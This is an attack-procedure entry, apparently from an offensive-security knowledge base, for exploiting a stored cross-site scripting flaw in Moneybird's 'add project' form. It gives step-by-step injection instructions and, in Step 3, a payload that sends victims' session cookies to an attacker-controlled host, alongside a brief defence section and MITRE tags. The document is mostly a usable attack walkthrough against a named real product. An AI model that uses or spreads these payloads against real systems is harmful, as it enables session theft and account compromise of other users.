---
id: proc-moneybird-stored-xss-injection
tags:
  - xss
  - stored-xss
  - javascript-injection
  - web-exploitation
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:26.626Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-and-Execute-Stored-XSS-in-Moneybird-Add-Project

## Summary

This procedure exploits a stored XSS vulnerability in Moneybird's 'add project' feature by injecting a malicious JavaScript payload into project fields, which is persisted without sanitization and executed when rendered in the administration panel, allowing potential session compromise or data theft for the authenticated user and other admins.

## Description

In the Moneybird web application, the 'add project' functionality fails to sanitize or encode user inputs before storing them in the database and rendering them back in the admin interface. An attacker with a valid account can submit a payload like `<script>alert(document.cookie)</script>` in the project name or description field. Upon submission, the payload is stored and later executed in the browser context of any user viewing the projects list, including the attacker and other team members. This can lead to theft of session cookies, keystroke logging, or further client-side attacks. The vulnerability requires only authenticated access and targets the web platform over HTTPS.

## Requirements

1. Valid Moneybird account with permissions to add projects
2. Web browser (e.g., Chrome, Firefox) with access to developer console for payload testing
3. Network connectivity to the Moneybird application (standard web access)

## Defense

Defensive measures and detection strategies:

- Implement input sanitization and output encoding (e.g., using libraries like DOMPurify) on all user-controlled fields in project creation
- Enable Content Security Policy (CSP) to restrict inline script execution
- Monitor for anomalous JavaScript execution in browser logs or via Web Application Firewall (WAF) rules detecting common XSS payloads

## Objectives

1. Persist malicious JavaScript in the project database
2. Execute the payload in the context of authenticated users to steal session data
3. Demonstrate medium-impact compromise within the administration panel

## Instructions

### Step 1: Authenticate and Navigate to Add Project

**Context**: Gain access to the vulnerable feature to prepare for payload injection.

Log in to your Moneybird account and navigate to the projects section, then select the 'add project' option. Ensure you are in the administration panel where projects are managed.

### Step 2: Inject Malicious Payload

**Context**: Submit an unsanitized JavaScript payload into a vulnerable input field to store it persistently.

In the project name or description field, enter a test payload such as:

```html
<script>alert('Stored XSS Confirmed');</script>
```

Submit the form to create the project. No command-line tools are needed; this is performed directly in the web interface.

> The payload is stored in the backend without escaping, ready for rendering.

### Step 3: Trigger and Verify Execution

**Context**: Render the stored project data to execute the payload and confirm the vulnerability.

Return to the projects list or refresh the page to view the newly added project. The payload should execute immediately upon rendering.

For impact demonstration, replace the alert with a more malicious payload like:

```html
<script>document.location='http://attacker.com/steal?cookie='+document.cookie;</script>
```

> Expected output includes a JavaScript alert or redirection to an attacker-controlled server, confirming execution in the victim's browser context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
- [[JavaScript]]
